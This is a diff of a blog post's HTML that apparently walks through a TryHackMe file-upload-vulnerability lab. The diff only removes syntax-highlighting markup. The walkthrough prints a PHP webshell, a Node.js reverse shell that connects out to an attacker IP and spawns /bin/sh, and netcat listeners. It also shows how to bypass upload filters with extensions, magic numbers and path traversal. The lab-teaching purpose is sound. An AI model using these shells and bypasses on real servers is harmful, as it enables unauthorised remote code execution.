@@ -199,21 +199,21 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <h3 id="methodology">Methodology</h3>
 <h4 id="webshells">Webshells</h4>
 <p>For a given webpage with upload form, run something like a <a href="">GoBuster</a> scan on <code>dir</code> mode, using a relevant wordlist with <code>-w</code>.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -u http://uploadform.com -w /usr/share/wordlists/dirbuster/directory-list-2.3.medium.txt
-</span></span></code></pre></div><p>If a directory is found that can plausibly house uploads from the web form, an uploaded webshell can be reached via the browser. If, as in the example, the server is running PHP, then a simple webshell can be invoked via:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#000">&lt;?</span><span style="color:#000">php</span> 
-</span></span><span style="display:flex;"><span>	<span style="color:#a90d91">echo</span> <span style="color:#000">system</span>(<span style="color:#000">$_GET</span>[<span style="color:#c41a16">&#34;cmd&#34;</span>]);
-</span></span><span style="display:flex;"><span><span style="color:#633820">?&gt;</span><span style="color:#000">
-</span></span></span></code></pre></div><p>From this point, system files can be read and/or attempts to upgrade the webshell to a remote shell.</p>
+<pre tabindex="0"><code>gobuster dir -u http://uploadform.com -w /usr/share/wordlists/dirbuster/directory-list-2.3.medium.txt
+</code></pre><p>If a directory is found that can plausibly house uploads from the web form, an uploaded webshell can be reached via the browser. If, as in the example, the server is running PHP, then a simple webshell can be invoked via:</p>
+<pre tabindex="0"><code>&lt;?php 
+	echo system($_GET[&#34;cmd&#34;]);
+?&gt;
+</code></pre><p>From this point, system files can be read and/or attempts to upgrade the webshell to a remote shell.</p>
 <h4 id="remote-shell">Remote Shell</h4>
 <p>After editing and uploading the necessary reverse shell script, such as <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">Pentest Monkey&rsquo;s 2007 PHP tool</a>, the attacking machine can invoke a <code>netcat</code> listener via the venerable</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp <span style="color:#1c01ce">4444</span>
-</span></span></code></pre></div><p>The shell script will be activated by navigating to the uploaded shell&rsquo;s location on the server with a browser. This will give the attacker RCE capabillities on the target server, though ideally the reverse shell would then be stabilized with user privileges escalated.</p>
+<pre tabindex="0"><code>nc -lvnp 4444
+</code></pre><p>The shell script will be activated by navigating to the uploaded shell&rsquo;s location on the server with a browser. This will give the attacker RCE capabillities on the target server, though ideally the reverse shell would then be stabilized with user privileges escalated.</p>
 <h4 id="question-51">Question 5.1</h4>
 <h5 id="run-a-gobuster-scan-on-the-website-using-the-syntax-from-the-screenshot-above-what-directory-looks-like-it-might-be-used-for-uploads">Run a Gobuster scan on the website using the syntax from the screenshot above. What directory looks like it might be used for uploads?</h5>
 <p>Running:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -u shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
-</span></span></code></pre></div><p>creates the following output:</p>
+<pre tabindex="0"><code>gobuster dir -u shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+</code></pre><p>creates the following output:</p>
 <p><img src="https://robscharf.github.io/images/uv/uv-gobuster.png" alt="UV - Gobuster"></p>
 <h4 id="question-52">Question 5.2</h4>
 <h5 id="get-either-a-web-shell-or-a-reverse-shell-on-the-machine-whats-the-flag-in-the-varwww-directory-of-the-server">Get either a web shell or a reverse shell on the machine. What&rsquo;s the flag in the /var/www/ directory of the server?</h5>
@@ -393,8 +393,8 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <p>The next example uses the same premise, but this time involving a server with an unknown filtering mechanism. This is known as doing it &ldquo;<em>black-box</em>.&rdquo;<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>.</p>
 <p>We begin by verifying that a standard <code>.jpeg</code> file can be uploaded; and that a <code>shell.php</code> script can not. After experimenting with files to better understand what the server will and will not accept, we reach the conclusion that there are no shell extensions that will pass through the filter and also execute on the server.</p>
 <p>We then remember that the filtering mechanism in the previous example used <code>pathinfo()</code> to get the file&rsquo;s extension by parsing the characters after the final <code>.</code> in the filename.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#000">$extension</span> <span style="color:#000">=</span> <span style="color:#000">pathinfo</span>(<span style="color:#000">$_FILES</span>[<span style="color:#c41a16">&#34;fileToUpload&#34;</span>][<span style="color:#c41a16">&#34;name&#34;</span>])[<span style="color:#c41a16">&#34;extension&#34;</span>];
-</span></span></code></pre></div><p>We then bypass the server&rsquo;s filter code by changing our payload&rsquo;s filename from <code>ptm-shell.php</code> to <code>ptm-shell.jpeg.php</code>, as the <code>PHP</code> script parses the file&rsquo;s extension as the characters that follow the final <code>.</code>.</p>
+<pre tabindex="0"><code>$extension = pathinfo($_FILES[&#34;fileToUpload&#34;][&#34;name&#34;])[&#34;extension&#34;];
+</code></pre><p>We then bypass the server&rsquo;s filter code by changing our payload&rsquo;s filename from <code>ptm-shell.php</code> to <code>ptm-shell.jpeg.php</code>, as the <code>PHP</code> script parses the file&rsquo;s extension as the characters that follow the final <code>.</code>.</p>
 <p>Before offering our task question, the text asks us to consider that these examples are among many possibilities for exploiting upload vulnerabilities.</p>
 <blockquote>
 <p>As with everything in hacking, we are looking to exploit flaws in code that others have written; this code may very well be uniquely written for the task at hand. This is the really important point to take away from this task: there are a million different ways to implement the same feature when it comes to programming &ndash; your exploitation must be tailored to the filter at hand. The key to bypassing any kind of server side filter is to enumerate and see what is allowed, as well as what is blocked; then try to craft a payload which can pass the criteria the filter is looking for.</p>
@@ -406,11 +406,11 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <p><img src="https://robscharf.github.io/images/uv/anx-home.png" alt="anx-home"></p>
 <p>First, we will upload a standard file to the server. Successsfully doing so will simultaneously give us a file to look for in the server&rsquo;s upload destination directory and also start informing us of which file formats pass through the filter. I will use the same <code>coffee.png</code> clip art file from the previous task for this purpose.</p>
 <p>We then begin our investigation by running a <code>gobuster</code> scan of <code>annex.uploadvulns.thm</code>:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -u annex.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o gb-annex
-</span></span></code></pre></div><p>The scan enumerates the following directories:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>1. /privacy <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 332<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://annex.uploadvulns.thm/privacy/<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>2. /assets <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 331<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://annex.uploadvulns.thm/assets/<span style="color:#000">]</span>
-</span></span></code></pre></div><p>While the <code>/assets</code> directory does not contain our uploaded image file, <code>/privacy</code> does. We note here that the filename has been modified to include date and time information before the existing name:</p>
+<pre tabindex="0"><code>gobuster dir -u annex.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o gb-annex
+</code></pre><p>The scan enumerates the following directories:</p>
+<pre tabindex="0"><code>1. /privacy (Status: 301) [Size: 332] [--&gt; http://annex.uploadvulns.thm/privacy/]
+2. /assets (Status: 301) [Size: 331] [--&gt; http://annex.uploadvulns.thm/assets/]
+</code></pre><p>While the <code>/assets</code> directory does not contain our uploaded image file, <code>/privacy</code> does. We note here that the filename has been modified to include date and time information before the existing name:</p>
 <p><img src="https://robscharf.github.io/images/uv/anx-assets.png" alt="anx-assets"></p>
 <p>From here, we try to upload our reverse shell script directly, but are given this error message, as our payload was filtered by the server.</p>
 <p><img src="https://robscharf.github.io/images/uv/anx-invalid.png" alt="anx-invalid"></p>
@@ -419,8 +419,8 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <p>While we receive <code>File type is invalid</code> responses for 8 of the 9 files listed above, <code>ptm-shell.php5</code> makes it through the server&rsquo;s filter and into the <code>/privacy</code> directory.</p>
 <p><img src="https://robscharf.github.io/images/uv/anx-php5.png" alt="anx-php5"></p>
 <p>From here we simply invoke our <code>netcat</code> listener on our attack machine with:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp <span style="color:#1c01ce">4444</span>
-</span></span></code></pre></div><p>and then run the script by visiting the file&rsquo;s location in our browser.</p>
+<pre tabindex="0"><code>nc -lvnp 4444
+</code></pre><p>and then run the script by visiting the file&rsquo;s location in our browser.</p>
 <p><img src="https://robscharf.github.io/images/uv/anx-solution.png" alt="anx-solution"></p>
 <h2 id="task-9---bypassing-server-side-filtering-magic-numbers">Task 9 - Bypassing Server-Side Filtering: Magic Numbers</h2>
 <p>This task builds on the previous one, highlighting the use of &ldquo;magic number checking&rdquo; as an approach to server-side filtering.</p>
@@ -429,8 +429,8 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <p>This task&rsquo;s walkthrough begins again with a webpage housing a file upload form. As is expected, <code>.php</code> files are caught in the server&rsquo;s filter, while <code>.jpeg</code> images are not.</p>
 <p>As we know that <code>.jpeg</code> files are permitted by the filter, we should be able to add the &ldquo;magic numbers&rdquo; <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">that correspond to this file type</a> to the top of our <code>.php</code> script. To do so, we first add 4 conventional characters (it does not matter which) to the top of our <code>ptm-shell.php</code> script.</p>
 <p>Next, we open the file in <code>hexeditor</code> (or an equivalent application) and change the conventional characters to <code>FF D8 FF DB</code> - the magic numbers for <code>.jpeg</code> format files. To check that this has been done properly, run:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>file ptm-shell.php
-</span></span></code></pre></div><p>This should return <code>ptm-shell.php: JPEG image data</code>.</p>
+<pre tabindex="0"><code>file ptm-shell.php
+</code></pre><p>This should return <code>ptm-shell.php: JPEG image data</code>.</p>
 <p>We are then able to upload our <code>.php</code> reverse shell script, now disguised as a <code>.jpeg</code> image, to the server and execute it.</p>
 <p>Before being given the challenge associated with this task, we are warned that directory indexing has been disabled on the target server.</p>
 <h4 id="question-91">Question 9.1</h4>
@@ -506,25 +506,25 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <p><img src="https://robscharf.github.io/images/uv/jewel-wap.png" alt="jewel-wap"></p>
 <p>From this, we learn that this site is running <a href="https://expressjs.com/">Express</a>, a <code>Node.js</code> web application framework. This means that our <code>ptm-shell.php</code> reverse shell script will almost certainly not work, as the server is configured to run <code>JavaScript</code> code.</p>
 <p>Luckily for us, the PayloadsAllTheThings <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs">Reverse Shell Cheat Sheet repository</a> on GitHub includes a reverse shell script for use with <code>Node.js</code>. Here it is:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>(<span style="color:#a90d91">function</span>(){
-</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">var</span> <span style="color:#000">net</span> <span style="color:#000">=</span> <span style="color:#000">require</span>(<span style="color:#c41a16">&#34;net&#34;</span>),
-</span></span><span style="display:flex;"><span>        <span style="color:#000">cp</span> <span style="color:#000">=</span> <span style="color:#000">require</span>(<span style="color:#c41a16">&#34;child_process&#34;</span>),
-</span></span><span style="display:flex;"><span>        <span style="color:#000">sh</span> <span style="color:#000">=</span> <span style="color:#000">cp</span>.<span style="color:#000">spawn</span>(<span style="color:#c41a16">&#34;/bin/sh&#34;</span>, []);
-</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">var</span> <span style="color:#000">client</span> <span style="color:#000">=</span> <span style="color:#a90d91">new</span> <span style="color:#000">net</span>.<span style="color:#000">Socket</span>();
-</span></span><span style="display:flex;"><span>    <span style="color:#000">client</span>.<span style="color:#000">connect</span>(<span style="color:#1c01ce">4242</span>, <span style="color:#c41a16">&#34;10.0.0.1&#34;</span>, <span style="color:#a90d91">function</span>(){
-</span></span><span style="display:flex;"><span>        <span style="color:#000">client</span>.<span style="color:#000">pipe</span>(<span style="color:#000">sh</span>.<span style="color:#000">stdin</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#000">sh</span>.<span style="color:#000">stdout</span>.<span style="color:#000">pipe</span>(<span style="color:#000">client</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#000">sh</span>.<span style="color:#000">stderr</span>.<span style="color:#000">pipe</span>(<span style="color:#000">client</span>);
-</span></span><span style="display:flex;"><span>    });
-</span></span><span style="display:flex;"><span>    <span style="color:#a90d91">return</span> <span style="color:#c41a16">/a/</span>; <span style="color:#177500">// Prevents the Node.js application from crashing
-</span></span></span><span style="display:flex;"><span><span style="color:#177500"></span>})();
-</span></span></code></pre></div><p>After configuring the port and IP address above to match those of our attack machine, we can save this as <code>njs-shell.js</code> to use a bit later.</p>
+<pre tabindex="0"><code>(function(){
+    var net = require(&#34;net&#34;),
+        cp = require(&#34;child_process&#34;),
+        sh = cp.spawn(&#34;/bin/sh&#34;, []);
+    var client = new net.Socket();
+    client.connect(4242, &#34;10.0.0.1&#34;, function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+</code></pre><p>After configuring the port and IP address above to match those of our attack machine, we can save this as <code>njs-shell.js</code> to use a bit later.</p>
 <h3 id="identifying-vulnerabilities">Identifying vulnerabilities</h3>
 <p>For more information, we can inspect the source code of the page, which includes a <code>.js</code> script called <code>/upload.js</code> that uses the following filtering scheme:</p>
 <p><img src="https://robscharf.github.io/images/uv/jewel-uploadjs.png" alt="jewel-uploadjs"></p>
 <p>Also, note this line in the source code of the home page:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#000">input</span> <span style="color:#836c28">id</span><span style="color:#000">=</span><span style="color:#c41a16">&#34;fileSelect&#34;</span> <span style="color:#836c28">type</span><span style="color:#000">=</span><span style="color:#c41a16">&#34;file&#34;</span> <span style="color:#836c28">name</span><span style="color:#000">=</span><span style="color:#c41a16">&#34;fileToUpload&#34;</span> <span style="color:#836c28">accept</span><span style="color:#000">=</span><span style="color:#c41a16">&#34;image/jpeg&#34;</span>&gt;
-</span></span></code></pre></div><p>We can deduce, from the above code, that the server:</p>
+<pre tabindex="0"><code>&lt;input id=&#34;fileSelect&#34; type=&#34;file&#34; name=&#34;fileToUpload&#34; accept=&#34;image/jpeg&#34;&gt;
+</code></pre><p>We can deduce, from the above code, that the server:</p>
 <ul>
 <li>Has a size/length limit in place</li>
 <li>Filters files that do not contain <code>ÿØÿ</code> as the first three &ldquo;magic number values&rdquo;
@@ -563,8 +563,8 @@ we need to figure out how to get our <code>njs-shell.js</code> reverse shell pas
 <p>In order to confirm our success, we can run another <code>gobuster</code> scan, which confirms the existence of <code>LED.jpg</code> in the <code>/content</code> directory.</p>
 <p><img src="https://robscharf.github.io/images/uv/jewel-jsjpg-upload.png" alt="jewel-jsjpg-upload"></p>
 <p>To activate our reverse shell and achieve RCE, we&rsquo;ll need to remember to enable our <code>netcat</code> listener with:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp <span style="color:#1c01ce">4444</span>
-</span></span></code></pre></div><p>Now we can navigate to the secret admin page that we identified at <code>http://jewel.uploadvulns.thm/admin</code> and determine how to activate our reverse shell via <code>http://jewel.uploadvulns.thm/content/LED.jpg</code>. The placeholder text of the form field tells us that we can input the location of files to execute from the <code>/modules</code> directory. From our previous More Enumeration efforts, we know that the <code>/content</code> directory sits adjacent to <code>/modules</code> under the root level of the server&rsquo;s filesystem. Thus, unless actively prohibited, we can use <code>../</code> to traverse directories. This means that by entering <code>../content/LED.jpg</code>, we should be able to activate our reverse shell script.</p>
+<pre tabindex="0"><code>nc -lvnp 4444
+</code></pre><p>Now we can navigate to the secret admin page that we identified at <code>http://jewel.uploadvulns.thm/admin</code> and determine how to activate our reverse shell via <code>http://jewel.uploadvulns.thm/content/LED.jpg</code>. The placeholder text of the form field tells us that we can input the location of files to execute from the <code>/modules</code> directory. From our previous More Enumeration efforts, we know that the <code>/content</code> directory sits adjacent to <code>/modules</code> under the root level of the server&rsquo;s filesystem. Thus, unless actively prohibited, we can use <code>../</code> to traverse directories. This means that by entering <code>../content/LED.jpg</code>, we should be able to activate our reverse shell script.</p>
 <p><img src="https://robscharf.github.io/images/uv/jewel-led-rce.png" alt="jewel-led-rce"></p>
 <p><em>et voilà!</em></p>
 <p>Thanks to <a href="https://tryhackme.com/p/MuirlandOracle">MuirlandOracle</a> for the informative room!</p>
@@ -735,15 +735,15 @@ we need to figure out how to get our <code>njs-shell.js</code> reverse shell pas
             <span class="button previous">
                 <a href="https://robscharf.github.io/posts/2022/05/how-to-add-a-backtick-hotkey-to-windows-10/">
                     <span class="button__icon">←</span>
-                    <span class="button__text">How to: Add a backtick hotkey to Windows 10</span>
+                    <span class="button__text">How-to: Add a backtick hotkey to Windows 10</span>
                 </a>
             </span>
             
 
             
             <span class="button next">
-                <a href="https://robscharf.github.io/posts/2022/04/finishing-the-owasp-juice-shop/">
-                    <span class="button__text">Finishing the OWASP Juice Shop</span>
+                <a href="https://robscharf.github.io/posts/2022/04/finishing-the-owasp-juice-shop-xss/">
+                    <span class="button__text">Finishing the OWASP Juice Shop XSS</span>
                     <span class="button__icon">→</span>
                 </a>
             </span>
